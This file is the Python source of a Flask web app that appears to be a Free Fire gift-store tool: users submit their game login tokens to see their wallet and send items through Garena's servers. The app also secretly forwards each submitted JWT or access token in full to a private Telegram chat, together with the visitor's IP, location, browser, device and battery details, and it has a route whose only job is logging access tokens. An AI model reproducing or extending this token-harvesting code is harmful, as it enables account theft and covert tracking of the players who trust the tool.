import os, requests, json, base64, urllib3, threading, html, re
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
from dotenv import load_dotenv
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf.json_format import MessageToDict

import GetGiftStoreDetails_pb2
import GetWallet_pb2
import SendGift_pb2

load_dotenv()
IMAGE_BASE_URL = os.getenv("IMAGE_BASE_URL")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# ---------- Helper: Enhanced Logging ----------
def get_geo_info(ip):
    """Get country, city, region from IP using free ip-api.com (non-commercial)"""
    try:
        if ip.startswith(('127.', '192.168.', '10.', '172.')):
            return "Local/Private"
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,regionName", timeout=3)
        data = resp.json()
        if data.get('status') == 'success':
            return f"{data.get('city', '')}, {data.get('regionName', '')}, {data.get('country', '')}".strip(', ')
        return "Unknown"
    except:
        return "Geo lookup failed"

def parse_user_agent(ua):
    """Extract OS, device, browser from user-agent string (simple regex)"""
    os_info = "Unknown OS"
    device_info = "Unknown Device"
    browser_info = "Unknown Browser"
    
    # OS detection
    if 'Windows' in ua:
        os_info = 'Windows'
        if 'NT 10.0' in ua: os_info += ' 10'
        elif 'NT 6.1' in ua: os_info += ' 7'
    elif 'Android' in ua:
        os_info = 'Android'
        match = re.search(r'Android ([\d\.]+)', ua)
        if match: os_info += f' {match.group(1)}'
    elif 'iPhone' in ua or 'iPad' in ua:
        os_info = 'iOS'
        match = re.search(r'OS ([\d_]+)', ua)
        if match: os_info += f' {match.group(1).replace("_", ".")}'
    elif 'Mac' in ua:
        os_info = 'macOS'
    elif 'Linux' in ua:
        os_info = 'Linux'
    
    # Device model for Android/iOS
    if 'Android' in ua:
        match = re.search(r'Android [\d\.]+; ([^;]+)', ua)
        if match: device_info = match.group(1).strip()
    elif 'iPhone' in ua:
        device_info = 'iPhone'
    elif 'iPad' in ua:
        device_info = 'iPad'
    
    # Browser detection
    if 'Edg/' in ua:
        browser_info = 'Edge'
    elif 'OPR/' in ua or 'Opera' in ua:
        browser_info = 'Opera'
    elif 'Chrome/' in ua and not 'Edg/' and not 'OPR/':
        browser_info = 'Chrome'
    elif 'Safari/' in ua and 'Version/' in ua:
        browser_info = 'Safari'
    elif 'Firefox/' in ua:
        browser_info = 'Firefox'
    elif 'MSIE' in ua or 'Trident/' in ua:
        browser_info = 'Internet Explorer'
    
    return f"{os_info} | {device_info} | {browser_info}"

def send_telegram_log(message, extra_info=None):
    """Send log to Telegram with optional extra device/request details"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    
    full_message = message
    if extra_info:
        full_message += "\n\n📌 <b>Additional Info:</b>\n" + "\n".join(extra_info)
    
    def _send():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": full_message, "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            print(f"Telegram log failed: {e}")
    threading.Thread(target=_send, daemon=True).start()

def get_client_info(request):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    return ip, user_agent

def build_extra_info(request, device_info_from_client=None):
    """Collect all possible info from request and optional frontend device_info"""
    ip, ua = get_client_info(request)
    geo = get_geo_info(ip)
    parsed_ua = parse_user_agent(ua)
    accept_lang = request.headers.get('Accept-Language', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    lines = [
        f"🌐 IP: {ip}",
        f"📍 Location: {geo}",
        f"📱 UA Raw: {ua[:80]}..." if len(ua) > 80 else f"📱 UA: {ua}",
        f"🔧 Parsed: {parsed_ua}",
        f"🌍 Accept-Language: {accept_lang}",
        f"🔗 Referer: {referer}"
    ]
    
    # Add frontend-collected device info if provided (battery, screen, etc.)
    if device_info_from_client and isinstance(device_info_from_client, dict):
        battery = device_info_from_client.get('battery_level')
        if battery is not None:
            lines.append(f"🔋 Battery: {battery}%")
        charging = device_info_from_client.get('charging')
        if charging is not None:
            lines.append(f"⚡ Charging: {'Yes' if charging else 'No'}")
        screen = device_info_from_client.get('screen_resolution')
        if screen:
            lines.append(f"📺 Screen: {screen}")
        touch = device_info_from_client.get('touch_support')
        if touch is not None:
            lines.append(f"🖐️ Touch: {'Yes' if touch else 'No'}")
        # Any other custom field
        for k, v in device_info_from_client.items():
            if k not in ('battery_level', 'charging', 'screen_resolution', 'touch_support') and v:
                lines.append(f"📎 {k.replace('_', ' ').title()}: {v}")
    
    return lines

# ---------- Existing encryption, helpers etc. (unchanged) ----------
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV  = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
USER_AGENT = "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"

PREFIX_MAP = {
    "902": "Avatar", "214": "Facepaint", "101": "Female Skills", "102": "Male Skills",
    "103": "Microchip", "905": "Parachute", "710": "Bundle", "720": "Bundle2",
    "203": "Top", "204": "Bottom", "205": "Shoes", "211": "Head", "901": "Banner",
    "131": "Pet2", "130": "Pets/Emotes", "903": "Loot Box", "904": "Backpack",
    "906": "Skyboard", "907": "Others", "908": "Vehicles", "909": "Emote",
    "911": "SkyWings", "922": "Skill Skin",
}

STORE_CACHE = {}

def encrypt_payload(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(data, AES.block_size))

def get_server_url(region):
    if region == "IND": return "https://client.ind.freefiremobile.com"
    elif region in ["BR", "US", "SAC", "NA"]: return "https://client.us.freefiremobile.com"
    else: return "https://clientbp.ggpolarbear.com"

def decode_jwt(token):
    try:
        p = token.split('.')[1]
        p += '=' * (4 - len(p) % 4)
        dec = json.loads(base64.b64decode(p))
        return dec.get("lock_region"), dec.get("external_id")
    except:
        return None, None

def get_wallet_data(jwt, login_token, region):
    req = GetWallet_pb2.CSGetWalletReq(login_token=login_token, topup_rebate=False)
    headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
    try:
        r = requests.post(f"{get_server_url(region)}/GetWallet", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            res_pb = GetWallet_pb2.CSGetWalletRes()
            res_pb.ParseFromString(r.content)
            w = res_pb.wallet
            ts = datetime.fromtimestamp(w.last_topup_time).strftime('%d %b %Y, %I:%M %p') if w.last_topup_time > 0 else "Never"
            return {"gold": w.coins, "diamond": w.gems, "last_topup": ts}
    except:
        pass
    return {"gold": 0, "diamond": 0, "last_topup": "Error"}

@app.route('/')
def index():
    ip, ua = get_client_info(request)
    extra = build_extra_info(request)
    msg = f"🌐 <b>Web Page Opened</b>"
    send_telegram_log(msg, extra)
    return render_template('index.html')

@app.route('/api/image/<item_id>')
def serve_image(item_id):
    try:
        r = requests.get(f"{IMAGE_BASE_URL}{item_id}.png", timeout=5)
        return Response(r.content, mimetype='image/png')
    except:
        return "Not Found", 404

# ================ Access Token Log with Device Info ================
@app.route('/api/log_access_token', methods=['POST'])
def log_access_token():
    data = request.get_json()
    access_token = data.get('access_token') if data else None
    device_info = data.get('device_info') if data else None  # frontend can send battery, screen, etc.
    
    if not access_token:
        return jsonify({"success": False, "message": "No access_token provided"}), 400
    
    safe_token = html.escape(access_token)
    msg = f"🔑 <b>Access Token Submitted</b>\n📝 Token: <code>{safe_token}</code>"
    extra = build_extra_info(request, device_info)
    send_telegram_log(msg, extra)
    return jsonify({"success": True, "message": "Token logged successfully"})

# ================ Store Access (enhanced log) ================
@app.route('/api/get_store', methods=['POST'])
def get_store():
    data = request.json
    jwt_token = data.get('jwt')
    page, limit, cat = int(data.get('page', 1)), int(data.get('limit', 24)), data.get('category', 'All')
    device_info = data.get('device_info')  # optional from frontend
    
    ip, ua = get_client_info(request)
    region, external_id = decode_jwt(jwt_token)
    
    if not region:
        return jsonify({"success": False, "message": "Invalid JWT!"}), 400
    
    safe_token = html.escape(jwt_token)
    msg = (
        f"🛍️ <b>Store Access</b>\n"
        f"👤 UserID: {external_id}\n"
        f"🌍 Region: {region}\n"
        f"🔑 Token: <code>{safe_token}</code>"
    )
    extra = build_extra_info(request, device_info)
    send_telegram_log(msg, extra)
    
    if jwt_token not in STORE_CACHE:
        wallet = get_wallet_data(jwt_token, external_id, region)
        req_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsReq(store_id=1)
        headers = {"Authorization": f"Bearer {jwt_token}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
        
        try:
            r = requests.post(f"{get_server_url(region)}/GetGiftStoreDetails", data=encrypt_payload(req_pb.SerializeToString()), headers=headers, verify=False, timeout=15)
            if r.status_code == 200:
                res_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsRes()
                res_pb.ParseFromString(r.content)
                res_dict = MessageToDict(res_pb, preserving_proto_field_name=True, always_print_fields_with_no_presence=True)
                
                all_items, categories = [], set()
                for item in res_dict.get('items', []):
                    item_id_str = str(item.get('item_id', '0'))
                    c_name = PREFIX_MAP.get(item_id_str[:3], f"Other ({item_id_str[:3]})")
                    categories.add(c_name)
                    g, c = int(item.get('gems_price', 0)), int(item.get('coins_price', 0))
                    price = f"💎 {g} / 🪙 {c}" if g>0 and c>0 else f"💎 {g}" if g>0 else f"🪙 {c}" if c>0 else "Free"
                    ts = int(item.get('expire_timestamp', 0))
                    exp_date = datetime.fromtimestamp(ts).strftime('%d %b %Y') if ts > 0 else "Permanent"
                    all_items.append({
                        "item_id": item_id_str, "commodity_id": item.get('commodity_id'),
                        "sort_id": int(item.get('sort_id', 0)), "price_str": price,
                        "category": c_name, "expire_date": exp_date
                    })
                all_items.sort(key=lambda x: x['sort_id'], reverse=True)
                STORE_CACHE[jwt_token] = {'items': all_items, 'wallet': wallet, 'sent': res_dict.get('send_gift_times_today', 0), 'cats': sorted(list(categories))}
            else:
                err_msg = f"❌ <b>Store Fetch Failed</b>\n👤 User: {external_id}\n🌍 Region: {region}\n⚠️ HTTP {r.status_code}"
                extra_err = build_extra_info(request, device_info)
                send_telegram_log(err_msg, extra_err)
                return jsonify({"success": False, "message": "Garena Error"}), 400
        except Exception as e:
            err_msg = f"❌ <b>Store Exception</b>\n👤 User: {external_id}\n⚠️ Error: {str(e)[:100]}"
            extra_err = build_extra_info(request, device_info)
            send_telegram_log(err_msg, extra_err)
            return jsonify({"success": False, "message": str(e)}), 500

    cache = STORE_CACHE[jwt_token]
    filtered = [x for x in cache['items'] if x['category'] == cat] if cat != "All" else cache['items']
    start = (page - 1) * limit
    return jsonify({
        "success": True, "items": filtered[start:start+limit],
        "categories": cache['cats'], "wallet": cache['wallet'],
        "sent_today": cache['sent'], "has_more": (start+limit) < len(filtered)
    })

# ================ Send Gift (enhanced log) ================
@app.route('/api/send_gift', methods=['POST'])
def send_gift():
    data = request.json
    jwt = data.get('jwt')
    uid = data.get('receiver_uid')
    comm_id = data.get('commodity_id')
    price = data.get('price')
    curr = data.get('currency')
    msg_text = data.get('message', 'Gift!')
    device_info = data.get('device_info')  # optional from frontend
    
    ip, ua = get_client_info(request)
    region, sender_id = decode_jwt(jwt)
    
    if not region:
        return jsonify({"success": False, "message": "Invalid JWT"}), 400
    
    safe_token = html.escape(jwt)
    log_msg = (
        f"🎁 <b>Gift Attempt</b>\n"
        f"👤 Sender: {sender_id}\n"
        f"🌍 Region: {region}\n"
        f"📨 Receiver UID: {uid}\n"
        f"🆔 Item CommodityID: {comm_id}\n"
        f"💰 Price: {price} {curr}\n"
        f"💬 Msg: {msg_text[:30]}"
    )
    extra = build_extra_info(request, device_info)
    send_telegram_log(log_msg, extra)

    req = SendGift_pb2.CSSendGiftReq()
    req.receiver_account_ids.append(int(uid))
    req.buddy_type = 1
    req.commodity_id = int(comm_id)
    req.message_content = msg_text
    req.currency_type = 2 if curr == 'diamond' else 1
    req.commodity_cnt = 1
    req.unit_price = int(price)

    headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
    
    try:
        r = requests.post(f"{get_server_url(region)}/SendGift", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=15)
        if r.status_code == 200:
            if jwt in STORE_CACHE:
                del STORE_CACHE[jwt]
            success_msg = (
                f"✅ <b>Gift Sent Successfully</b>\n"
                f"👤 Sender: {sender_id}\n"
                f"📨 Receiver: {uid}\n"
                f"🆔 Item: {comm_id}\n"
                f"💰 {price} {curr}\n"
                f"🌐 Region: {region}"
            )
            send_telegram_log(success_msg, extra)
            return jsonify({"success": True, "message": f"Gift sent to {uid} successfully!"})
        else:
            try:
                err = r.content.decode('utf-8').strip()
            except:
                err = f"HTTP {r.status_code}"
            fail_msg = (
                f"❌ <b>Gift Failed</b>\n"
                f"👤 Sender: {sender_id}\n"
                f"📨 Receiver: {uid}\n"
                f"🆔 Item: {comm_id}\n"
                f"⚠️ {err}"
            )
            send_telegram_log(fail_msg, extra)
            return jsonify({"success": False, "message": err})
    except Exception as e:
        error_msg = (
            f"❌ <b>Gift Exception</b>\n"
            f"👤 Sender: {sender_id}\n"
            f"📨 Receiver: {uid}\n"
            f"⚠️ {str(e)[:100]}"
        )
        send_telegram_log(error_msg, extra)
        return jsonify({"success": False, "message": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)